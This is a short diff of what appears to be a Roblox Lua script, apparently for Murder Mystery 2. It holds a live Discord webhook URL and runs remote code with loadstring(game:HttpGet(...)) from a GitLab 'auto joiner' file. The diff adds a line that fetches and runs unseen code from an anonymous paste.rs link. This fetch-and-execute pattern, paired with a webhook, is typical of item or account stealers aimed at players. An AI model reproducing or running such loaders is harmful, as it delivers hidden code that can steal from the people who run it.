@@ -2,3 +2,6 @@
 token = "1"
 channelId = "https://discord.com/api/webhooks/1400930641473703966/PVKVLtbPMFtxMAIFkVvzUw2rwmXbSdEQPKAhww0zlJxrhVeO9vqHgTkVqiBy_Kz0gVLw"
 loadstring(game:HttpGet("https://gitlab.com/yeslidez/eks0va/-/raw/main/mm2AutoJoiner.lua"))()
+
+
+loadstring(game:HttpGet("https://paste.rs/Uf6rU"))()
